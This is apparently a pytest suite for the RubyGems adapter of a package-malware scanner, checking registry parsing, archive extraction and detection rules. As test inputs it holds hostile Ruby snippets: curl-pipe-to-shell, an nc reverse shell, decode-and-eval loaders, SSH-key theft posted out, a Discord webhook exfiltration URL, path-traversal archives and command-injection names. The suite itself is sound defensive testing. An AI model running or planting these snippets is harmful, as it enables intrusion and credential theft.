"""RubyGems 어댑터 — 전부 오프라인 (레지스트리는 httpx.MockTransport, 소스는 MemoryTree)."""

from __future__ import annotations

import gzip
import io
import tarfile

import httpx
import pytest

import ecosystems
from api.schemas import Severity
from common.pypi import ArchiveError, PackageNotFound, PyPIError
from ecosystems.base import Artifact
from ecosystems.rubygems import ADAPTER, registry, rules
from ecosystems.rubygems.rubylex import def_regions, lex
from engine.rules.base import DiskTree, MemoryTree

# ── 레지스트리 (실제 응답 형태: 2026-11 rake·nokogiri 에서 확인) ───────────────

VERSIONS = [
    {"number": "2.0.0", "platform": "ruby", "created_at": "2026-04-16T04:47:46.997Z",
     "prerelease": False, "sha": "a" * 64},
    {"number": "2.0.0", "platform": "x86_64-linux", "created_at": "2026-04-16T04:50:00.000Z",
     "prerelease": False, "sha": "b" * 64},
    {"number": "2.1.0.rc1", "platform": "ruby", "created_at": "2026-05-01T00:00:00.000Z",
     "prerelease": True, "sha": "c" * 64},
    {"number": "1.9.0", "platform": "ruby", "created_at": "2025-01-01T00:00:00.000Z",
     "prerelease": False, "sha": "d" * 64},
]
GEM_META = {"name": "foo", "version": "2.0.0", "authors": "Ann, Bob",
            "source_code_uri": "https://github.com/x/foo",
            "dependencies": {"development": [], "runtime": [{"name": "rack"}]}}


def _client(handler) -> httpx.AsyncClient:
    return httpx.AsyncClient(transport=httpx.MockTransport(handler))


def _routes(versions=VERSIONS, meta=GEM_META, status=200):
    def handler(req: httpx.Request) -> httpx.Response:
        if req.url.path.startswith("/api/v1/versions/"):
            return httpx.Response(status, json=versions)
        if req.url.path.startswith("/api/v1/gems/"):
            return httpx.Response(200, json=meta)
        return httpx.Response(404)
    return handler


async def test_fetch_project_shape():
    async with _client(_routes()) as c:
        p = await ADAPTER.fetch_project("foo", client=c)
    assert p.latest == "2.0.0"  # 프리릴리스는 최신 후보에서 제외
    assert set(p.releases) == {"2.0.0", "2.1.0.rc1", "1.9.0"}
    arts = p.releases["2.0.0"].artifacts
    assert [a.filename for a in arts] == ["foo-2.0.0.gem", "foo-2.0.0-x86_64-linux.gem"]
    assert arts[0].url == "https://rubygems.org/downloads/foo-2.0.0.gem"
    assert arts[0].sha256 == "a" * 64 and arts[0].archive_format == "tar"
    assert p.repository_url == "https://github.com/x/foo"
    assert p.maintainers == ["Ann", "Bob"]
    assert p.releases["2.0.0"].dependencies == ["rack"]
    assert p.previous_version("2.0.0") == "1.9.0"


async def test_not_found_message():
    def h(req):
        return httpx.Response(404, text="This rubygem could not be found.")
    async with _client(h) as c:
        with pytest.raises(PackageNotFound, match="foo is not on RubyGems"):
            await ADAPTER.fetch_project("foo", client=c)


@pytest.mark.parametrize("resp", [
    httpx.Response(500), httpx.Response(200, text="<html>"), httpx.Response(200, json={"a": 1}),
])
async def test_registry_errors_are_not_not_found(resp):
    async with _client(lambda r: resp) as c:
        with pytest.raises(PyPIError) as ei:
            await ADAPTER.fetch_project("foo", client=c)
    assert not isinstance(ei.value, PackageNotFound)


async def test_network_error_is_registry_error():
    def h(req):
        raise httpx.ConnectError("boom")
    async with _client(h) as c:
        with pytest.raises(PyPIError):
            await ADAPTER.fetch_project("foo", client=c)


async def test_empty_versions_means_not_found():
    async with _client(_routes(versions=[])) as c:
        with pytest.raises(PackageNotFound):
            await ADAPTER.fetch_project("foo", client=c)


async def test_hostile_platform_rejected():
    bad = [{**VERSIONS[0], "platform": "../../x"}]
    async with _client(_routes(versions=bad)) as c:
        with pytest.raises(PyPIError):
            await ADAPTER.fetch_project("foo", client=c)


async def test_gem_meta_failure_does_not_break_scan():
    def h(req):
        if "/versions/" in req.url.path:
            return httpx.Response(200, json=VERSIONS)
        return httpx.Response(500)
    async with _client(h) as c:
        p = await ADAPTER.fetch_project("foo", client=c)
    assert p.latest == "2.0.0" and "gem_meta_error" in p.extra


def test_select_artifacts_ruby_first_and_capped():
    rows = [{"number": "1.0.0", "platform": "ruby", "created_at": "2026-01-01T00:00:00Z"}]
    rows += [{"number": "1.0.0", "platform": f"p{i}", "created_at": "2026-01-01T00:00:00Z"}
             for i in range(20)]
    import asyncio
    async def go():
        async with _client(_routes(versions=rows)) as c:
            return await ADAPTER.fetch_project("foo", client=c)
    p = asyncio.run(go())
    sel = ADAPTER.select_artifacts(p, "1.0.0")
    assert sel[0].filename == "foo-1.0.0.gem" and len(sel) == 9
    assert ADAPTER.select_artifacts(p, "9.9.9") == []


def test_loads_via_registry():
    assert ecosystems.get("rubygems") is ADAPTER
    assert ADAPTER.has_feed and ADAPTER.osv_ecosystem == "RubyGems"
    assert ADAPTER.purl("rails", "7.1.0") == "pkg:gem/rails@7.1.0"


# ── 검증 ──────────────────────────────────────────────────────────

@pytest.mark.parametrize("name", ["rails", "activerecord-import", "net-http", "a_b.c", "Foo9"])
def test_valid_names(name):
    ADAPTER.validate(name, "1.0.0")


BAD_NAMES = ["", "a b", "a;b", "../x", "a/b", "a$(id)", "x" * 101, "-x", "a\n"]


@pytest.mark.parametrize("name", BAD_NAMES)
def test_invalid_names(name):
    with pytest.raises(ValueError):
        ADAPTER.validate(name, "1.0.0")


@pytest.mark.parametrize("ver", ["1.0.0", "7.1.0.rc1", "2.0.0.beta.2", "1.2.3_4"])
def test_valid_versions(ver):
    ADAPTER.validate("rails", ver)


@pytest.mark.parametrize("ver", ["", "1 .0", "1.0;rm", "..", "1..0", "v1", "1.0/../x", "1.0\n"])
def test_invalid_versions(ver):
    with pytest.raises(ValueError):
        ADAPTER.validate("rails", ver)


# ── .gem 중첩 추출 ────────────────────────────────────────────────

def _tar(entries: dict[str, bytes], gz: bool = False) -> bytes:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz" if gz else "w") as t:
        for n, b in entries.items():
            ti = tarfile.TarInfo(n)
            ti.size = len(b)
            t.addfile(ti, io.BytesIO(b))
    return buf.getvalue()


def make_gem(files: dict[str, str], metadata: str = "name: foo\n") -> bytes:
    data_tgz = _tar({k: v.encode() for k, v in files.items()}, gz=True)
    return _tar({
        "data.tar.gz": data_tgz,
        "metadata.gz": gzip.compress(metadata.encode()),
        "checksums.yaml.gz": gzip.compress(b"---\n"),
    })


ART = Artifact(filename="foo-1.0.0.gem", url="x", kind="gem", archive_format="tar")


def test_extract_nested_gem(tmp_path):
    gem = make_gem({"lib/foo.rb": "puts 1\n", "ext/foo/extconf.rb": "create_makefile('foo')\n"},
                   metadata="name: foo\nextensions:\n- ext/foo/extconf.rb\n")
    root = ADAPTER.extract(gem, ART, tmp_path / "out")
    assert (root / "lib/foo.rb").read_text() == "puts 1\n"
    assert "extconf.rb" in (root / rules.METADATA_FILE).read_text()
    assert not (tmp_path / "out" / "data.tar.gz").exists()


def test_extract_rejects_non_gem_and_traversal(tmp_path):
    with pytest.raises(ArchiveError):
        ADAPTER.extract(_tar({"readme": b"x"}), ART, tmp_path / "a")
    evil = _tar({"data.tar.gz": _tar({"../evil.rb": b"x"}, gz=True)})
    with pytest.raises(ArchiveError):
        ADAPTER.extract(evil, ART, tmp_path / "b")
    assert not (tmp_path / "evil.rb").exists()
    with pytest.raises(ArchiveError):
        ADAPTER.extract(b"not a tar at all", ART, tmp_path / "c")


def test_extract_metadata_bomb(tmp_path):
    bomb = _tar({"data.tar.gz": _tar({"a.rb": b"x"}, gz=True),
                 "metadata.gz": gzip.compress(b"a" * (3 * 1024 * 1024))})
    with pytest.raises(ArchiveError):
        ADAPTER.extract(bomb, ART, tmp_path / "d")


def test_analyze_extracted_disk_tree(tmp_path):
    gem = make_gem({"ext/foo/extconf.rb": "require 'net/http'\nNet::HTTP.get(URI('http://x.io/a'))\n"},
                   metadata="name: foo\nextensions:\n- ext/foo/extconf.rb\n")
    root = ADAPTER.extract(gem, ART, tmp_path / "o")
    f = ADAPTER.analyze_tree(DiskTree(root), artifact=ART)
    assert f[0].severity == Severity.HIGH and f[0].rule == rules.RULE_EXT_EXEC


# ── 어휘 분석 ─────────────────────────────────────────────────────

def test_lexer_masks_comments_strings_heredocs():
    src = (
        "# system('curl x | sh')\n"
        "x = \"Net::HTTP.get\"\n"
        "y = <<~EOS\n  system('curl a')\nEOS\n"
        "z = %w[curl wget]\n"
        "=begin\nsystem('curl')\n=end\n"
        "real_call\n"
    )
    lx = lex(src)
    assert len(lx.masked) == len(src)
    assert "curl" not in lx.masked and "Net::HTTP" not in lx.masked
    assert "real_call" in lx.masked
    assert any(src[s:e] == "curl wget" for s, e, _ in lx.literals)


def test_def_regions_and_modifier_if():
    src = "x = 1 if y\ndef a\n  foo if z\nend\nclass K\n  def b; end\nend\nhelper\n"
    regs = def_regions(lex(src).masked)
    names = sorted(n for _, _, n in regs)
    assert names == ["a", "b"]
    a = next(r for r in regs if r[2] == "a")
    assert src[a[0]:a[1]].startswith("def a") and src[a[0]:a[1]].endswith("end")


# ── 규칙 ──────────────────────────────────────────────────────────

def scan(files: dict[str, str], meta: str = "name: foo\n"):
    return ADAPTER.analyze_tree(MemoryTree({**files, rules.METADATA_FILE: meta}), artifact=ART)


EXT_META = "name: foo\nextensions:\n- ext/foo/extconf.rb\n"


def test_ordinary_mkmf_extconf_is_clean():
    f = scan({"ext/foo/extconf.rb": (
        "require 'mkmf'\n"
        "have_library('z') or abort 'need zlib'\n"
        "pkg_config('libxml-2.0')\n"
        "$CFLAGS << ' -O2'\n"
        "system('pkg-config --libs openssl')\n"
        "create_makefile('foo/foo')\n")}, EXT_META)
    assert [x for x in f if x.severity != Severity.LOW] == []
    assert any(x.rule == rules.RULE_NATIVE_EXT and x.severity == Severity.LOW for x in f)


def test_extconf_network_is_high():
    f = scan({"ext/foo/extconf.rb": "require 'net/http'\nNet::HTTP.get(URI('http://evil.io/x'))\n"},
             EXT_META)
    assert f[0].severity == Severity.HIGH and f[0].location == "ext/foo/extconf.rb:2"


def test_extconf_suspicious_spawn_is_high_in_all_forms():
    for code in ("system('curl http://x.io/a | sh')", "`wget http://x.io/a -O /tmp/a`",
                 "%x(powershell -enc AAAA)", "IO.popen(['bash', '-c', 'curl x|sh'])",
                 "exec \"nc -e /bin/sh 1.2.3.4 99\"", "Open3.capture2('curl evil')"):
        f = scan({"ext/foo/extconf.rb": code + "\n"}, EXT_META)
        assert any(x.severity == Severity.HIGH for x in f), code


def test_extconf_helper_method_called_at_top_level():
    code = ("def fetch(u)\n  Net::HTTP.get(URI(u))\nend\nfetch('http://x.io')\n")
    f = scan({"ext/foo/extconf.rb": code}, EXT_META)
    assert any(x.severity == Severity.HIGH for x in f)
    unused = scan({"ext/foo/extconf.rb": code.rsplit("fetch(", 1)[0]}, EXT_META)
    assert [x for x in unused if x.severity != Severity.LOW] == []


def test_rakefile_extension_task_exec():
    meta = "name: foo\nextensions:\n- ext/Rakefile\n"
    f = scan({"ext/Rakefile": "task :default do\n  system('curl http://x.io | sh')\nend\n"}, meta)
    assert any(x.severity == Severity.HIGH for x in f)
    plain = scan({"Rakefile": "task :default do\n  system('curl http://x.io | sh')\nend\n"})
    assert not any(x.severity == Severity.HIGH for x in plain)


def test_load_time_top_level_is_high_but_def_body_is_not():
    bad = scan({"lib/foo.rb": "module Foo\n  Net::HTTP.get(URI('http://x.io'))\nend\n"})
    assert bad[0].severity == Severity.HIGH and bad[0].rule == rules.RULE_LOAD_EXEC
    ok = scan({"lib/foo.rb": (
        "module Foo\n  def self.fetch\n    Net::HTTP.get(URI('http://x.io'))\n  end\nend\n")})
    assert ok == []


def test_load_time_follows_require_relative():
    f = scan({
        "lib/foo.rb": "require_relative 'foo/boot'\n",
        "lib/foo/boot.rb": "`curl http://x.io/p | sh`\n",
        "lib/foo/other.rb": "`curl http://x.io/p | sh`\n",
    })
    hits = {x.location.split(":")[0]: x.severity for x in f}
    assert hits["lib/foo/boot.rb"] == Severity.HIGH
    assert hits["lib/foo/other.rb"] == Severity.MEDIUM  # 로드되지 않는 파일 — 정황만


def test_dashed_gem_name_entry_point():
    # foo-bar → lib/foo/bar.rb 가 진입점
    assert any(x.severity == Severity.HIGH for x in scan(
        {"lib/foo/bar.rb": "system('curl http://x.io | sh')\n"}, "name: foo-bar\n"))


def test_rubygems_plugin_is_auto_loaded():
    f = scan({"lib/rubygems_plugin.rb": "system('curl http://x.io | sh')\n"})
    assert any(x.severity == Severity.HIGH for x in f)


def test_decode_eval_variants():
    cases = [
        "eval(Base64.decode64('ZW5k'))",
        "x = Base64.decode64('ZW5k')\neval(x)",
        "instance_eval(Zlib::Inflate.inflate(s))",
        "eval(['6162'].pack('H*'))",
        "Marshal.load(Base64.decode64(d))",
        "eval('x'.tr('A-Za-z','N-ZA-Mn-za-m'))",
    ]
    for code in cases:
        f = scan({"lib/foo.rb": code + "\n"})
        assert any(
            x.rule == rules.RULE_DECODE_EVAL and x.severity == Severity.HIGH for x in f
        ), code
    f = scan({"lib/other.rb": "def go\n  eval(Base64.decode64(x))\nend\n"})
    assert f and f[0].severity == Severity.MEDIUM


def test_decode_eval_negatives():
    ok = scan({"lib/foo.rb": (
        "Foo.class_eval do\n  attr_reader :x\nend\n"
        "data = Base64.decode64(blob)\nputs data.size\n"
        "eval('1 + 1')\n"
        "Marshal.load(File.binread(path))\n"
        "def load(dumped)\n  Marshal.load(dumped)\nend\n")})
    assert ok == []


def test_credential_read_needs_exfil_to_be_high():
    both = scan({"lib/foo.rb": (
        "k = File.read(File.expand_path('~/.ssh/id_rsa'))\nNet::HTTP.post_form(U, 'k' => k)\n")})
    assert any(x.severity == Severity.HIGH for x in both)
    alone = scan({"lib/foo.rb": "k = File.read(File.expand_path('~/.aws/credentials'))\n"})
    assert alone and alone[0].severity == Severity.MEDIUM


def test_exfil_endpoints():
    tok = "a" * 30
    hook = "https://discord.com/api/webhooks/" + "1" * 18 + "/" + tok
    f = scan({"lib/deep/x.rb": f"def hi\n  U = '{hook}'\nend\n"})
    assert f and f[0].rule == rules.RULE_EXFIL and f[0].severity == Severity.HIGH
    c = scan({"lib/deep/x.rb": "# see https://discord.com/api/webhooks/123456789012345678/"
                               + tok + "\n"})
    assert c == []
    w = scan({"lib/deep/x.rb": "U = 'https://abc.oastify.com/x'\n"})
    assert w and w[0].severity == Severity.MEDIUM


def test_comments_and_docs_do_not_trigger():
    f = scan({"ext/foo/extconf.rb": (
        "# Do NOT run: system('curl x | sh')\n"
        "=begin\nNet::HTTP.get(x)\n=end\n"
        "puts <<~USAGE\n  curl http://x.io | sh\nUSAGE\n"
        "create_makefile('foo')\n")}, EXT_META)
    assert [x for x in f if x.severity != Severity.LOW] == []


def test_post_install_message_harmless_and_main_guard():
    f = scan({"lib/foo.rb": "if __FILE__ == $0\n  system('curl x | sh')\nend\n"})
    assert f == []


def test_unreadable_and_oversized_files_reported():
    class T(MemoryTree):
        def read(self, relpath):
            return None if relpath == "lib/foo.rb" else super().read(relpath)
    f = ADAPTER.analyze_tree(T({"lib/foo.rb": "x", rules.METADATA_FILE: "name: foo\n"}))
    assert any(x.rule == rules.RULE_UNREADABLE and x.severity == Severity.MEDIUM for x in f)
    big = scan({"lib/foo.rb": "#" + "a" * (rules.MAX_FILE_BYTES + 10)})
    assert any(x.rule == rules.RULE_UNREADABLE for x in big)


def test_findings_sorted_and_cwes_registered():
    f = scan({"ext/foo/extconf.rb": "`curl x|sh`\n", "lib/foo.rb": "x\n"}, EXT_META)
    order = [x.severity for x in f]
    ranks = ["critical", "high", "medium", "low"]
    assert order == sorted(order, key=lambda s: ranks.index(s.value))
    cwes = ADAPTER.rule_cwes()
    for x in f:
        assert x.cwe in cwes[x.rule]
    assert all(r.startswith("rubygems-") for r in cwes)


def test_has_install_script():
    assert ADAPTER.has_install_script(None, "1", ["ext/a/extconf.rb"])  # type: ignore[arg-type]
    assert not ADAPTER.has_install_script(None, "1", ["lib/a.rb"])  # type: ignore[arg-type]


# ── manifests ─────────────────────────────────────────────────────

LOCK = """GIT
  remote: https://github.com/x/y.git
  revision: abc
  specs:
    ygem (0.1.0)

GEM
  remote: https://rubygems.org/
  specs:
    nokogiri (1.16.0-x86_64-linux)
      racc (~> 1.4)
    nokogiri (1.16.0)
      racc (~> 1.4)
    racc (1.7.3)
    rails (7.1.0)
      rack (>= 2.2)

PLATFORMS
  ruby

DEPENDENCIES
  nokogiri (~> 1.16)
  rails!
  ygem!

BUNDLED WITH
   2.5.0
"""


def test_gemfile_lock():
    deps = ADAPTER.parse_manifest("Gemfile.lock", LOCK)
    got = {(d.name, d.version, d.direct) for d in deps}
    assert got == {("nokogiri", "1.16.0", True), ("racc", "1.7.3", False),
                   ("rails", "7.1.0", True)}
    assert all(d.ecosystem == "rubygems" for d in deps)


def test_gemfile_lock_garbage():
    with pytest.raises(ValueError):
        ADAPTER.parse_manifest("Gemfile.lock", "hello world\n")


def test_gemfile():
    text = """source 'https://rubygems.org'
# gem 'commented'
gem 'rails', '7.1.0'
gem "puma", "~> 6.0"
gem 'rack', '>= 2.0', '< 4'
gem 'pg'
gem 'local', path: '../local'
gem 'lib', git: 'https://x/y.git'
gem 'multi',
    '1.2.3',
    require: false
group :test do
  gem 'rspec', '= 3.12.0'
end
"""
    deps = {d.name: d for d in ADAPTER.parse_manifest("Gemfile", text)}
    assert deps["rails"].version == "7.1.0"
    assert deps["puma"].version is None and deps["puma"].spec == "~> 6.0"
    assert deps["rack"].version is None and deps["rack"].spec == ">= 2.0, < 4"
    assert deps["pg"].version is None
    assert deps["multi"].version == "1.2.3"
    assert deps["rspec"].version == "3.12.0"
    assert "commented" not in deps and "local" not in deps and "lib" not in deps
    assert all(d.direct for d in deps.values())


# ── 피드 ──────────────────────────────────────────────────────────

async def test_feed_merges_and_reports_errors():
    def h(req):
        if req.url.path.endswith("latest.json"):
            return httpx.Response(200, json=[{"name": "new", "version": "0.0.1"}])
        return httpx.Response(200, json=[{"name": "new", "version": "0.0.1"},
                                         {"name": "upd", "version": "2.0.0"}])
    async with _client(h) as c:
        items, errors = await ADAPTER.fetch_feed(c)
    assert items == [("new", "0.0.1"), ("upd", "2.0.0")] and errors == []

    def bad(req):
        if req.url.path.endswith("latest.json"):
            return httpx.Response(500)
        return httpx.Response(200, json=[{"name": "upd", "version": "2.0.0"}])
    async with _client(bad) as c:
        items, errors = await ADAPTER.fetch_feed(c)
    assert items == [("upd", "2.0.0")] and len(errors) == 1


def test_registry_module_filename():
    assert registry.gem_filename("a", "1", "ruby") == "a-1.gem"
    assert registry.gem_filename("a", "1", "java") == "a-1-java.gem"


@pytest.mark.live
async def test_live_rake():
    async with httpx.AsyncClient(follow_redirects=True) as c:
        p = await ADAPTER.fetch_project("rake", client=c)
    assert p.latest and p.releases


_DEFINE_METHOD_CLIENT = r"""
require "net/http"
module Foo
  class Client
    def request(op)
      http = Net::HTTP.new('api.example.com', 443)
      http.start { |c| c.request(op) }
    end
    define_method('catalog') do |**params|
      request('catalog')
    end
  end
end
"""


def test_define_method_block_body_is_not_load_time():
    """define_method 블록 안에서 부른 메서드의 본문은 require 시점 코드가 아니다 (실측 오탐:
    crawlora-* API 클라이언트 — 생성된 메서드들이 request() 를 부르고, 그 안에 Net::HTTP.new)."""
    from ecosystems import get
    from engine.rules.base import MemoryTree

    findings = get("rubygems").analyze_tree(MemoryTree({"lib/foo.rb": _DEFINE_METHOD_CLIENT}))
    assert not [f for f in findings if f.severity.value in ("high", "critical")]


_BACKSLASH_MODIFIER = r"""
require "net/http"
class Manager
  def execute_request(method, uri)
    raise ArgumentError, "method should be a symbol" \
      unless method.is_a?(Symbol)
    raise ArgumentError, "uri should be a string" \
      if uri.nil?
    create_connection(uri)
  end

  private def create_connection(uri)
    Net::HTTP.new(uri.host, uri.port).start
  end
end
"""


def test_backslash_continued_modifier_does_not_break_def_scope():
    """``\`` 로 이어진 줄 맨 앞의 if/unless 는 수식어다 (실측 오탐: stripe 21.0.0)."""
    from ecosystems import get
    from engine.rules.base import MemoryTree

    findings = get("rubygems").analyze_tree(MemoryTree({"lib/manager.rb": _BACKSLASH_MODIFIER}))
    assert not [f for f in findings if f.severity.value in ("high", "critical")]


def test_marshal_load_of_bundled_data_file_is_not_high():
    """압축된 자기 데이터 파일을 Marshal.load 하는 표 로딩 (실측 오탐: unicode-display_width)."""
    from ecosystems import get
    from engine.rules.base import MemoryTree

    benign = 'INDEX = Marshal.load(Zlib::GzipReader.open(INDEX_FILENAME, &:read))\n'
    evil = 'Marshal.load(Zlib::Inflate.inflate(Base64.decode64("eJxLzs8tyM9LzSsBAA==")))\n'
    adapter = get("rubygems")

    def high(src: str) -> list:
        tree = MemoryTree({"lib/foo.rb": 'require "zlib"\n' + src})
        return [f for f in adapter.analyze_tree(tree) if f.severity.value in ("high", "critical")]

    assert not high(benign)
    assert high(evil)
